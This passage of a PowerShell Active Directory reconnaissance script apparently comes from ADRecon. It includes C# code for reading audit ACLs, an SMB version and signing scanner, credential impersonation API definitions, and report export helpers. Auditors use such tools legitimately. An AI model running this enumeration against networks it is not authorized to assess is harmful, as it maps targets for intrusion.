                            String IdentityReference = Convert.ToString(Rule.IdentityReference);
                            PSObject ObjectObj = new PSObject();
                            ObjectObj.Members.Add(new PSNoteProperty("Name", CleanString(Name)));
                            ObjectObj.Members.Add(new PSNoteProperty("Type", Type));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectTypeName", LDAPClass.GUIDs[Convert.ToString(Rule.ObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectTypeName", LDAPClass.GUIDs[Convert.ToString(Rule.InheritedObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("ActiveDirectoryRights", Rule.ActiveDirectoryRights));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReferenceName", LDAPClass.AdSIDDictionary.ContainsKey(IdentityReference) ? LDAPClass.AdSIDDictionary[IdentityReference] : IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("AuditFlags", Rule.AuditFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectFlags", Rule.ObjectFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceFlags", Rule.InheritanceFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceType", Rule.InheritanceType));
                            ObjectObj.Members.Add(new PSNoteProperty("Inherited", Rule.IsInherited));
                            ObjectObj.Members.Add(new PSNoteProperty("PropagationFlags", Rule.PropagationFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectType", Rule.ObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectType", Rule.InheritedObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReference", Rule.IdentityReference));
                            SACLList.Add( ObjectObj );
                        }
                    }

                    return SACLList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        //The interface and implmentation class used to handle the results (this implementation just writes the strings to a file)

        interface IResultsHandler
        {
            void processResults(Object[] t);

            Object[] finalise();
        }

        class SimpleResultsHandler : IResultsHandler
        {
            private Object lockObj = new Object();
            private List<Object> processed = new List<Object>();

            public SimpleResultsHandler()
            {
            }

            public void processResults(Object[] results)
            {
                lock (lockObj)
                {
                    if (results.Length != 0)
                    {
                        for (var i = 0; i < results.Length; i++)
                        {
                            processed.Add((PSObject)results[i]);
                        }
                    }
                }
            }

            public Object[] finalise()
            {
                return processed.ToArray();
            }
        }
    }
}
"@




$PingCastleSMBScannerSource = @"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Runtime.InteropServices;
using System.Management.Automation;

namespace ADRecon
{
    public class PingCastleScannersSMBScanner
	{
        [StructLayout(LayoutKind.Explicit)]
		struct SMB_Header {
			[FieldOffset(0)]
			public UInt32 Protocol;
			[FieldOffset(4)]
			public byte Command;
			[FieldOffset(5)]
			public int Status;
			[FieldOffset(9)]
			public byte  Flags;
			[FieldOffset(10)]
			public UInt16 Flags2;
			[FieldOffset(12)]
			public UInt16 PIDHigh;
			[FieldOffset(14)]
			public UInt64 SecurityFeatures;
			[FieldOffset(22)]
			public UInt16 Reserved;
			[FieldOffset(24)]
			public UInt16 TID;
			[FieldOffset(26)]
			public UInt16 PIDLow;
			[FieldOffset(28)]
			public UInt16 UID;
			[FieldOffset(30)]
			public UInt16 MID;
		};
		// https://msdn.microsoft.com/en-us/library/cc246529.aspx
		[StructLayout(LayoutKind.Explicit)]
		struct SMB2_Header {
			[FieldOffset(0)]
			public UInt32 ProtocolId;
			[FieldOffset(4)]
			public UInt16 StructureSize;
			[FieldOffset(6)]
			public UInt16 CreditCharge;
			[FieldOffset(8)]
			public UInt32 Status; // to do SMB3
			[FieldOffset(12)]
			public UInt16 Command;
			[FieldOffset(14)]
			public UInt16 CreditRequest_Response;
			[FieldOffset(16)]
			public UInt32 Flags;
			[FieldOffset(20)]
			public UInt32 NextCommand;
			[FieldOffset(24)]
			public UInt64 MessageId;
			[FieldOffset(32)]
			public UInt32 Reserved;
			[FieldOffset(36)]
			public UInt32 TreeId;
			[FieldOffset(40)]
			public UInt64 SessionId;
			[FieldOffset(48)]
			public UInt64 Signature1;
			[FieldOffset(56)]
			public UInt64 Signature2;
		}
        [StructLayout(LayoutKind.Explicit)]
		struct SMB2_NegotiateRequest
		{
			[FieldOffset(0)]
			public UInt16 StructureSize;
			[FieldOffset(2)]
			public UInt16 DialectCount;
			[FieldOffset(4)]
			public UInt16 SecurityMode;
			[FieldOffset(6)]
			public UInt16 Reserved;
			[FieldOffset(8)]
			public UInt32 Capabilities;
			[FieldOffset(12)]
			public Guid ClientGuid;
			[FieldOffset(28)]
			public UInt64 ClientStartTime;
			[FieldOffset(36)]
			public UInt16 DialectToTest;
		}
		const int SMB_COM_NEGOTIATE	= 0x72;
		const int SMB2_NEGOTIATE = 0;
		const int SMB_FLAGS_CASE_INSENSITIVE = 0x08;
		const int SMB_FLAGS_CANONICALIZED_PATHS = 0x10;
		const int SMB_FLAGS2_LONG_NAMES					= 0x0001;
		const int SMB_FLAGS2_EAS							= 0x0002;
		const int SMB_FLAGS2_SECURITY_SIGNATURE_REQUIRED	= 0x0010	;
		const int SMB_FLAGS2_IS_LONG_NAME					= 0x0040;
		const int SMB_FLAGS2_ESS							= 0x0800;
		const int SMB_FLAGS2_NT_STATUS					= 0x4000;
		const int SMB_FLAGS2_UNICODE						= 0x8000;
		const int SMB_DB_FORMAT_DIALECT = 0x02;
		static byte[] GenerateSmbHeaderFromCommand(byte command)
		{
			SMB_Header header = new SMB_Header();
			header.Protocol = 0x424D53FF;
			header.Command = command;
			header.Status = 0;
			header.Flags = SMB_FLAGS_CASE_INSENSITIVE | SMB_FLAGS_CANONICALIZED_PATHS;
			header.Flags2 = SMB_FLAGS2_LONG_NAMES | SMB_FLAGS2_EAS | SMB_FLAGS2_SECURITY_SIGNATURE_REQUIRED | SMB_FLAGS2_IS_LONG_NAME | SMB_FLAGS2_ESS | SMB_FLAGS2_NT_STATUS | SMB_FLAGS2_UNICODE;
			header.PIDHigh = 0;
			header.SecurityFeatures = 0;
			header.Reserved = 0;
			header.TID = 0xffff;
			header.PIDLow = 0xFEFF;
			header.UID = 0;
			header.MID = 0;
			return getBytes(header);
		}
		static byte[] GenerateSmb2HeaderFromCommand(byte command)
		{
			SMB2_Header header = new SMB2_Header();
			header.ProtocolId = 0x424D53FE;
			header.Command = command;
			header.StructureSize = 64;
			header.Command = command;
			header.MessageId = 0;
			header.Reserved = 0xFEFF;
			return getBytes(header);
		}
		static byte[] getBytes(object structure)
		{
			int size = Marshal.SizeOf(structure);
			byte[] arr = new byte[size];
			IntPtr ptr = Marshal.AllocHGlobal(size);
			Marshal.StructureToPtr(structure, ptr, true);
			Marshal.Copy(ptr, arr, 0, size);
			Marshal.FreeHGlobal(ptr);
			return arr;
		}
		static byte[] getDialect(string dialect)
		{
			byte[] dialectBytes = Encoding.ASCII.GetBytes(dialect);
			byte[] output = new byte[dialectBytes.Length + 2];
			output[0] = 2;
			output[output.Length - 1] = 0;
			Array.Copy(dialectBytes, 0, output, 1, dialectBytes.Length);
			return output;
		}
		static byte[] GetNegotiateMessage(byte[] dialect)
		{
			byte[] output = new byte[dialect.Length + 3];
			output[0] = 0;
			output[1] = (byte) dialect.Length;
			output[2] = 0;
			Array.Copy(dialect, 0, output, 3, dialect.Length);
			return output;
		}
		// MS-SMB2  2.2.3 SMB2 NEGOTIATE Request
		static byte[] GetNegotiateMessageSmbv2(int DialectToTest)
		{
			SMB2_NegotiateRequest request = new SMB2_NegotiateRequest();
			request.StructureSize = 36;
			request.DialectCount = 1;
			request.SecurityMode = 1; // signing enabled
			request.ClientGuid = Guid.NewGuid();
			request.DialectToTest = (UInt16) DialectToTest;
			return getBytes(request);
		}
		static byte[] GetNegotiatePacket(byte[] header, byte[] smbPacket)
		{
			byte[] output = new byte[smbPacket.Length + header.Length + 4];
			output[0] = 0;
			output[1] = 0;
			output[2] = 0;
			output[3] = (byte)(smbPacket.Length + header.Length);
			Array.Copy(header, 0, output, 4, header.Length);
			Array.Copy(smbPacket, 0, output, 4 + header.Length, smbPacket.Length);
			return output;
		}
		public static bool DoesServerSupportDialect(string server, string dialect)
		{
			Trace.WriteLine("Checking " + server + " for SMBV1 dialect " + dialect);
			TcpClient client = new TcpClient();
			try
			{
				client.Connect(server, 445);
			}
			catch (Exception)
			{
				throw new Exception("port 445 is closed on " + server);
			}
			try
			{
				NetworkStream stream = client.GetStream();
				byte[] header = GenerateSmbHeaderFromCommand(SMB_COM_NEGOTIATE);
				byte[] dialectEncoding = getDialect(dialect);
				byte[] negotiatemessage = GetNegotiateMessage(dialectEncoding);
				byte[] packet = GetNegotiatePacket(header, negotiatemessage);
				stream.Write(packet, 0, packet.Length);
				stream.Flush();
				byte[] netbios = new byte[4];
				if (stream.Read(netbios, 0, netbios.Length) != netbios.Length)
                {
                    return false;
                }
				byte[] smbHeader = new byte[Marshal.SizeOf(typeof(SMB_Header))];
				if (stream.Read(smbHeader, 0, smbHeader.Length) != smbHeader.Length)
                {
                    return false;
                }
				byte[] negotiateresponse = new byte[3];
				if (stream.Read(negotiateresponse, 0, negotiateresponse.Length) != negotiateresponse.Length)
                {
                    return false;
                }
				if (negotiateresponse[1] == 0 && negotiateresponse[2] == 0)
				{
					Trace.WriteLine("Checking " + server + " for SMBV1 dialect " + dialect + " = Supported");
					return true;
				}
				Trace.WriteLine("Checking " + server + " for SMBV1 dialect " + dialect + " = Not supported");
				return false;
			}
			catch (Exception)
			{
				throw new ApplicationException("Smb1 is not supported on " + server);
			}
		}
		public static bool DoesServerSupportDialectWithSmbV2(string server, int dialect, bool checkSMBSigning)
		{
			Trace.WriteLine("Checking " + server + " for SMBV2 dialect 0x" + dialect.ToString("X2"));
			TcpClient client = new TcpClient();
			try
			{
				client.Connect(server, 445);
			}
			catch (Exception)
			{
				throw new Exception("port 445 is closed on " + server);
			}
			try
			{
				NetworkStream stream = client.GetStream();
				byte[] header = GenerateSmb2HeaderFromCommand(SMB2_NEGOTIATE);
				byte[] negotiatemessage = GetNegotiateMessageSmbv2(dialect);
				byte[] packet = GetNegotiatePacket(header, negotiatemessage);
				stream.Write(packet, 0, packet.Length);
				stream.Flush();
				byte[] netbios = new byte[4];
				if( stream.Read(netbios, 0, netbios.Length) != netbios.Length)
                {
                    return false;
                }
				byte[] smbHeader = new byte[Marshal.SizeOf(typeof(SMB2_Header))];
				if (stream.Read(smbHeader, 0, smbHeader.Length) != smbHeader.Length)
                {
                    return false;
                }
				if (smbHeader[8] != 0 || smbHeader[9] != 0 || smbHeader[10] != 0 || smbHeader[11] != 0)
				{
					Trace.WriteLine("Checking " + server + " for SMBV2 dialect 0x" + dialect.ToString("X2") + " = Not supported via error code");
					return false;
				}
				byte[] negotiateresponse = new byte[6];
				if (stream.Read(negotiateresponse, 0, negotiateresponse.Length) != negotiateresponse.Length)
                {
                    return false;
                }
                if (checkSMBSigning)
                {
                    // https://support.microsoft.com/en-in/help/887429/overview-of-server-message-block-signing
                    // https://msdn.microsoft.com/en-us/library/cc246561.aspx
				    if (negotiateresponse[2] == 3)
				    {
					    Trace.WriteLine("Checking " + server + " for SMBV2 SMB Signing dialect 0x" + dialect.ToString("X2") + " = Supported");
					    return true;
				    }
                    else
                    {
                        return false;
                    }
                }
				int selectedDialect = negotiateresponse[5] * 0x100 + negotiateresponse[4];
				if (selectedDialect == dialect)
				{
					Trace.WriteLine("Checking " + server + " for SMBV2 dialect 0x" + dialect.ToString("X2") + " = Supported");
					return true;
				}
				Trace.WriteLine("Checking " + server + " for SMBV2 dialect 0x" + dialect.ToString("X2") + " = Not supported via not returned dialect");
				return false;
			}
			catch (Exception)
			{
				throw new ApplicationException("Smb2 is not supported on " + server);
			}
		}
		public static bool SupportSMB1(string server)
		{
			try
			{
				return DoesServerSupportDialect(server, "NT LM 0.12");
			}
			catch (Exception)
			{
				return false;
			}
		}
		public static bool SupportSMB2(string server)
		{
			try
			{
				return (DoesServerSupportDialectWithSmbV2(server, 0x0202, false) || DoesServerSupportDialectWithSmbV2(server, 0x0210, false));
			}
			catch (Exception)
			{
				return false;
			}
		}
		public static bool SupportSMB3(string server)
		{
			try
			{
				return (DoesServerSupportDialectWithSmbV2(server, 0x0300, false) || DoesServerSupportDialectWithSmbV2(server, 0x0302, false) || DoesServerSupportDialectWithSmbV2(server, 0x0311, false));
			}
			catch (Exception)
			{
				return false;
			}
		}
		public static string Name { get { return "smb"; } }
		public static PSObject GetPSObject(string computer)
		{
            PSObject DCSMBObj = new PSObject();
            if (computer == "")
            {
                DCSMBObj.Members.Add(new PSNoteProperty("SMB Port Open", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB1(NT LM 0.12)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB2(0x0202)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB2(0x0210)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0300)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0302)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0311)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB Signing", null));
                return DCSMBObj;
            }
            bool isPortOpened = true;
			bool SMBv1 = false;
			bool SMBv2_0x0202 = false;
			bool SMBv2_0x0210 = false;
			bool SMBv3_0x0300 = false;
			bool SMBv3_0x0302 = false;
			bool SMBv3_0x0311 = false;
            bool SMBSigning = false;
			try
			{
				try
				{
					SMBv1 = DoesServerSupportDialect(computer, "NT LM 0.12");
				}
				catch (ApplicationException)
				{
				}
				try
				{
					SMBv2_0x0202 = DoesServerSupportDialectWithSmbV2(computer, 0x0202, false);
					SMBv2_0x0210 = DoesServerSupportDialectWithSmbV2(computer, 0x0210, false);
					SMBv3_0x0300 = DoesServerSupportDialectWithSmbV2(computer, 0x0300, false);
					SMBv3_0x0302 = DoesServerSupportDialectWithSmbV2(computer, 0x0302, false);
					SMBv3_0x0311 = DoesServerSupportDialectWithSmbV2(computer, 0x0311, false);
				}
				catch (ApplicationException)
				{
				}
			}
			catch (Exception)
			{
				isPortOpened = false;
			}
			if (SMBv3_0x0311)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0311, true);
			}
			else if (SMBv3_0x0302)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0302, true);
			}
			else if (SMBv3_0x0300)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0300, true);
			}
			else if (SMBv2_0x0210)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0210, true);
			}
			else if (SMBv2_0x0202)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0202, true);
			}
            DCSMBObj.Members.Add(new PSNoteProperty("SMB Port Open", isPortOpened));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB1(NT LM 0.12)", SMBv1));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB2(0x0202)", SMBv2_0x0202));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB2(0x0210)", SMBv2_0x0210));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0300)", SMBv3_0x0300));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0302)", SMBv3_0x0302));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0311)", SMBv3_0x0311));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB Signing", SMBSigning));
            return DCSMBObj;
		}
	}
}
"@







$Advapi32Def = @'
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool LogonUser(string lpszUsername, string lpszDomain, string lpszPassword, int dwLogonType, int dwLogonProvider, out IntPtr phToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();
'@



$Kernel32Def = @'
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
'@

Function Get-DateDiff
{

    param (
        [Parameter(Mandatory = $true)]
        [DateTime] $Date1,

        [Parameter(Mandatory = $true)]
        [DateTime] $Date2
    )

    If ($Date2 -gt $Date1)
    {
        $DDiff = $Date2 - $Date1
    }
    Else
    {
        $DDiff = $Date1 - $Date2
    }
    Return $DDiff
}

Function Get-DNtoFQDN
{

    param(
        [Parameter(Mandatory = $true)]
        [string] $ADObjectDN
    )

    $Index = $ADObjectDN.IndexOf('DC=')
    If ($Index)
    {
        $ADObjectDNDomainName = $($ADObjectDN.SubString($Index)) -replace 'DC=','' -replace ',','.'
    }
    Else
    {

        [array] $ADObjectDNArray = $ADObjectDN -Split ("DC=")
        $ADObjectDNArray | ForEach-Object {
            [array] $temp = $_ -Split (",")
            [string] $ADObjectDNArrayItemDomainName += $temp[0] + "."
        }
        $ADObjectDNDomainName = $ADObjectDNArrayItemDomainName.Substring(1, $ADObjectDNArrayItemDomainName.Length - 2)
    }
    Return $ADObjectDNDomainName
}

Function Export-ADRCSV
{

    param(
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [PSObject] $ADRObj,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [String] $ADFileName
    )

    Try
    {
        $ADRObj | Export-Csv -Path $ADFileName -NoTypeInformation
    }
    Catch
    {
        Write-Warning "[Export-ADRCSV] Failed to export $($ADFileName)."
        Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
    }
}

Function Export-ADRXML
{

    param(
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [PSObject] $ADRObj,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [String] $ADFileName
    )

    Try
    {
        (ConvertTo-Xml -NoTypeInformation -InputObject $ADRObj).Save($ADFileName)
    }
    Catch
    {
        Write-Warning "[Export-ADRXML] Failed to export $($ADFileName)."
        Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
    }
}

Function Export-ADRJSON
{

    param(
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [PSObject] $ADRObj,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [String] $ADFileName
    )

    Try
    {
        ConvertTo-JSON -InputObject $ADRObj | Out-File -FilePath $ADFileName
    }
    Catch
    {
        Write-Warning "[Export-ADRJSON] Failed to export $($ADFileName)."
        Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
    }
}

Function Export-ADRHTML
{

    param(
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [PSObject] $ADRObj,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [String] $ADFileName,

        [Parameter(Mandatory = $false)]
        [String] $ADROutputDir = $null
    )

$Header = @"
<style type="text/css">
th {
	color:white;
	background-color:blue;
}
td, th {
	border:0px solid black;
	border-collapse:collapse;
	white-space:pre;
}
tr:nth-child(2n+1) {
    background-color: #dddddd;
}
tr:hover td {
    background-color: #c1d5f8;
}
table, tr, td, th {
	padding: 0px;
	margin: 0px;
	white-space:pre;
}
table {
	margin-left:1px;
}
</style>
"@
    Try
    {
        If ($ADFileName.Contains("Index"))
        {
            $HTMLPath  = -join($ADROutputDir)
            $HTMLPath = $((Convert-Path $HTMLPath).TrimEnd("\"))
            $HTMLFiles = Get-ChildItem -Path $HTMLPath -name
            $HTML = $HTMLFiles | ConvertTo-HTML -Title "ADRecon" -Property @{Label="Table of Contents";Expression={"<a href='$($_)'>$($_)</a>"}} -Head $Header

            Add-Type -AssemblyName System.Web
            [System.Web.HttpUtility]::HtmlDecode($HTML) | Out-File -FilePath $ADFileName
        }
        Else
        {
            If ($ADRObj -is [array])
            {
                $ADRObj | Select-Object * | ConvertTo-HTML -As Table -Head $Header | Out-File -FilePath $ADFileName
            }
            Else
            {
                ConvertTo-HTML -InputObject $ADRObj -As Table -Head $Header | Out-File -FilePath $ADFileName
            }
        }
    }
    Catch
    {
        Write-Warning "[Export-ADRHTML] Failed to export $($ADFileName)."
        Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
    }
}

Function Export-ADR
{

    param(
        [Parameter(Mandatory = $true)]
        [PSObject] $ADRObj,

        [Parameter(Mandatory = $true)]
        [String] $ADROutputDir,

        [Parameter(Mandatory = $true)]
        [array] $OutputType,

        [Parameter(Mandatory = $true)]
        [String] $ADRModuleName
    )

    Switch ($OutputType)
    {
        'STDOUT'
        {
            If ($ADRModuleName -ne "AboutThisScan")
            {
                If ($ADRObj -is [array])
                {

                    $ADRObj | Out-String -Stream
                }
                Else
                {

                    $ADRObj | Format-List | Out-String -Stream
                }
            }
        }
        'CSV'
        {
            $ADFileName  = -join($ADROutputDir,'\','CSV-Files','\',$ADRModuleName,'.csv')
            Export-ADRCSV -ADRObj $ADRObj -ADFileName $ADFileName
        }
        'XML'
        {
            $ADFileName  = -join($ADROutputDir,'\','XML-Files','\',$ADRModuleName,'.xml')
            Export-ADRXML -ADRObj $ADRObj -ADFileName $ADFileName
        }
        'JSON'
        {
            $ADFileName  = -join($ADROutputDir,'\','JSON-Files','\',$ADRModuleName,'.json')
            Export-ADRJSON -ADRObj $ADRObj -ADFileName $ADFileName
        }
        'HTML'
        {
            $ADFileName  = -join($ADROutputDir,'\','\',$ADRModuleName,'.html')
            Export-ADRHTML -ADRObj $ADRObj -ADFileName $ADFileName -ADROutputDir $ADROutputDir
        }
    }
}

Function Get-ADRExcelComObj
{



    Try
    {

        $SaveVerbosePreference = $script:VerbosePreference
        $script:VerbosePreference = 'SilentlyContinue'
        $global:excel = New-Object -ComObject excel.application
        If ($SaveVerbosePreference)
        {
            $script:VerbosePreference = $SaveVerbosePreference
            Remove-Variable SaveVerbosePreference
        }
    }
    Catch
    {
        If ($SaveVerbosePreference)
        {
            $script:VerbosePreference = $SaveVerbosePreference
            Remove-Variable SaveVerbosePreference
        }
        Write-Warning "[Get-ADRExcelComObj] Excel does not appear to be installed. Skipping generation of ADRecon-Report.xlsx. Use the -GenExcel parameter to generate the ADRecon-Report.xslx on a host with Microsoft Excel installed."
        Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
        Return $null
    }
    $excel.Visible = $true
    $excel.Interactive = $false
    $global:workbook = $excel.Workbooks.Add()
    If ($workbook.Worksheets.Count -eq 3)
    {
        $workbook.WorkSheets.Item(3).Delete()
        $workbook.WorkSheets.Item(2).Delete()
    }
}

Function Get-ADRExcelComObjRelease
{

    param(
        [Parameter(Mandatory = $true)]
        $ComObjtoRelease,

        [Parameter(Mandatory = $false)]
        [bool] $Final = $false
    )


    If ($Final)
    {
        [System.Runtime.InteropServices.Marshal]::FinalReleaseComObject($ComObjtoRelease) | Out-Null
    }
    Else
    {
        [System.Runtime.InteropServices.Marshal]::ReleaseComObject($ComObjtoRelease) | Out-Null
    }
    [System.GC]::Collect()
    [System.GC]::WaitForPendingFinalizers()
}

Function Get-ADRExcelWorkbook
{

    param (
        [Parameter(Mandatory = $true)]
        [string] $name
    )

    $workbook.Worksheets.Add() | Out-Null
    $worksheet = $workbook.Worksheets.Item(1)
    $worksheet.Name = $name

    Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
    Remove-Variable worksheet
}

Function Get-ADRExcelImport
{

    param (
        [Parameter(Mandatory = $true)]
        [string] $ADFileName,

        [Parameter(Mandatory = $false)]
        [int] $method = 1,

        [Parameter(Mandatory = $false)]
        [int] $row = 1,

        [Parameter(Mandatory = $false)]
        [int] $column = 1
    )

    $excel.ScreenUpdating = $false
    If ($method -eq 1)
    {
        If (Test-Path $ADFileName)
        {
            $worksheet = $workbook.Worksheets.Item(1)
            $TxtConnector = ("TEXT;" + $ADFileName)
            $CellRef = $worksheet.Range("A1")

            $Connector = $worksheet.QueryTables.add($TxtConnector, $CellRef)


            $worksheet.QueryTables.item($Connector.name).TextFilePlatform = 65001
            $worksheet.QueryTables.item($Connector.name).TextFileCommaDelimiter = $True
            $worksheet.QueryTables.item($Connector.name).TextFileParseType = 1
            $worksheet.QueryTables.item($Connector.name).Refresh() | Out-Null
            $worksheet.QueryTables.item($Connector.name).delete()

            Get-ADRExcelComObjRelease -ComObjtoRelease $CellRef
            Remove-Variable CellRef
            Get-ADRExcelComObjRelease -ComObjtoRelease $Connector
            Remove-Variable Connector

            $listObject = $worksheet.ListObjects.Add([Microsoft.Office.Interop.Excel.XlListObjectSourceType]::xlSrcRange, $worksheet.UsedRange, $null, [Microsoft.Office.Interop.Excel.XlYesNoGuess]::xlYes, $null)
            $listObject.TableStyle = "TableStyleLight2" # Style Cheat Sheet: https://msdn.microsoft.com/en-au/library/documentformat.openxml.spreadsheet.tablestyle.aspx
            $worksheet.UsedRange.EntireColumn.AutoFit() | Out-Null
        }
        Remove-Variable ADFileName
    }
    Elseif ($method -eq 2)
    {
        $worksheet = $workbook.Worksheets.Item(1)
        If (Test-Path $ADFileName)
        {
            $ADTemp = Import-Csv -Path $ADFileName
            $ADTemp | ForEach-Object {
                Foreach ($prop in $_.PSObject.Properties)
                {
                    $worksheet.Cells.Item($row, $column) = $prop.Name
                    $worksheet.Cells.Item($row, $column + 1) = $prop.Value
                    $row++
                }
            }
            Remove-Variable ADTemp
            $listObject = $worksheet.ListObjects.Add([Microsoft.Office.Interop.Excel.XlListObjectSourceType]::xlSrcRange, $worksheet.UsedRange, $null, [Microsoft.Office.Interop.Excel.XlYesNoGuess]::xlYes, $null)
            $listObject.TableStyle = "TableStyleLight2" # Style Cheat Sheet: https://msdn.microsoft.com/en-au/library/documentformat.openxml.spreadsheet.tablestyle.aspx
            $usedRange = $worksheet.UsedRange
            $usedRange.EntireColumn.AutoFit() | Out-Null
        }
        Else
        {
            $worksheet.Cells.Item($row, $column) = "Error!"
        }
        Remove-Variable ADFileName
    }
    $excel.ScreenUpdating = $true

    Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
    Remove-Variable worksheet
}


Function Get-ADRExcelPivotTable
{

    param (
        [Parameter(Mandatory = $true)]
        [string] $SrcSheetName,

        [Parameter(Mandatory = $true)]
        [string] $PivotTableName,

        [Parameter(Mandatory = $false)]
        [array] $PivotRows,

        [Parameter(Mandatory = $false)]
        [array] $PivotColumns,

        [Parameter(Mandatory = $false)]
        [array] $PivotFilters,

        [Parameter(Mandatory = $false)]
        [array] $PivotValues,

        [Parameter(Mandatory = $false)]
        [array] $PivotPercentage,

        [Parameter(Mandatory = $false)]
        [string] $PivotLocation = "R1C1"
    )

    $excel.ScreenUpdating = $false
    $SrcWorksheet = $workbook.Sheets.Item($SrcSheetName)
    $workbook.ShowPivotTableFieldList = $false










    $PivotFailed = $false
    Try
    {
        $PivotCaches = $workbook.PivotCaches().Create([Microsoft.Office.Interop.Excel.XlPivotTableSourceType]::xlDatabase, $SrcWorksheet.UsedRange, [Microsoft.Office.Interop.Excel.XlPivotTableVersionList]::xlPivotTableVersion12)
    }
    Catch
    {
        $PivotFailed = $true
        Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
    }
    If ( $PivotFailed -eq $true )
    {
        $rows = $SrcWorksheet.UsedRange.Rows.Count
        If ($SrcSheetName -eq "Computer SPNs")
        {
            $PivotCols = "A1:B"
        }
        ElseIf ($SrcSheetName -eq "Users")
        {
            $PivotCols = "A1:AI"
        }
        $UsedRange = $SrcWorksheet.Range($PivotCols+$rows)
        $PivotCaches = $workbook.PivotCaches().Create([Microsoft.Office.Interop.Excel.XlPivotTableSourceType]::xlDatabase, $UsedRange, [Microsoft.Office.Interop.Excel.XlPivotTableVersionList]::xlPivotTableVersion12)
        Remove-Variable rows
	Remove-Variable PivotCols
        Remove-Variable UsedRange
    }
    Remove-Variable PivotFailed
    $PivotTable = $PivotCaches.CreatePivotTable($PivotLocation,$PivotTableName)


    If ($PivotRows)
    {
        ForEach ($Row in $PivotRows)
        {
            $PivotField = $PivotTable.PivotFields($Row)
            $PivotField.Orientation = [Microsoft.Office.Interop.Excel.XlPivotFieldOrientation]::xlRowField
        }
    }

    If ($PivotColumns)
    {
        ForEach ($Col in $PivotColumns)
        {
            $PivotField = $PivotTable.PivotFields($Col)
            $PivotField.Orientation = [Microsoft.Office.Interop.Excel.XlPivotFieldOrientation]::xlColumnField
        }
    }

    If ($PivotFilters)
    {
        ForEach ($Fil in $PivotFilters)
        {
            $PivotField = $PivotTable.PivotFields($Fil)
            $PivotField.Orientation = [Microsoft.Office.Interop.Excel.XlPivotFieldOrientation]::xlPageField
        }
    }

    If ($PivotValues)
    {
        ForEach ($Val in $PivotValues)
        {
            $PivotField = $PivotTable.PivotFields($Val)
            $PivotField.Orientation = [Microsoft.Office.Interop.Excel.XlPivotFieldOrientation]::xlDataField
        }
    }

    If ($PivotPercentage)
    {
        ForEach ($Val in $PivotPercentage)
        {
            $PivotField = $PivotTable.PivotFields($Val)
            $PivotField.Orientation = [Microsoft.Office.Interop.Excel.XlPivotFieldOrientation]::xlDataField
            $PivotField.Calculation = [Microsoft.Office.Interop.Excel.XlPivotFieldCalculation]::xlPercentOfTotal
            $PivotTable.ShowValuesRow = $false
        }
    }


    $excel.ScreenUpdating = $true

    Get-ADRExcelComObjRelease -ComObjtoRelease $PivotField
    Remove-Variable PivotField
    Get-ADRExcelComObjRelease -ComObjtoRelease $PivotTable
    Remove-Variable PivotTable
    Get-ADRExcelComObjRelease -ComObjtoRelease $PivotCaches
    Remove-Variable PivotCaches
    Get-ADRExcelComObjRelease -ComObjtoRelease $SrcWorksheet
    Remove-Variable SrcWorksheet
}

Function Get-ADRExcelAttributeStats
{

    param (
        [Parameter(Mandatory = $true)]
        [string] $SrcSheetName,

        [Parameter(Mandatory = $true)]
        [string] $Title1,

